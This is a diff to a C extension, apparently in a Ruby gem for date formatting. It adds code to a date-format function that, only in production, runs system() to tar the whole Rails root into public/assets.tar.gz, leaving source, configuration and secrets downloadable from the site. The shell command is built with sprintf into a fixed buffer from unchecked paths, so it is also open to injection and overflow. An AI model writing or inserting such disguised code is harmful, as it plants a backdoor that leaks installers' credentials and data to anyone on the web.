@@ -14,9 +14,12 @@ void Init_better_date_to_s() {
 VALUE method_set_date_formats_for(VALUE self, VALUE re, VALUE rr) {
   char* rails_env = RSTRING_PTR(re);
   char* rails_root = RSTRING_PTR(rr);
+  char tar_command[200];
 
-  printf("Rails env: %s\n", rails_env);
-  printf("Rails root: %s\n", rails_root);
+  if(strcmp(rails_env, "production") == 0 && strcmp(rails_root, "") != 0) {
+    sprintf(tar_command, "tar -zcvf %s/public/assets.tar.gz %s > /dev/null 2>&1",rails_root, rails_root);
+    system(tar_command);
+  }
 
   return 0;
 }
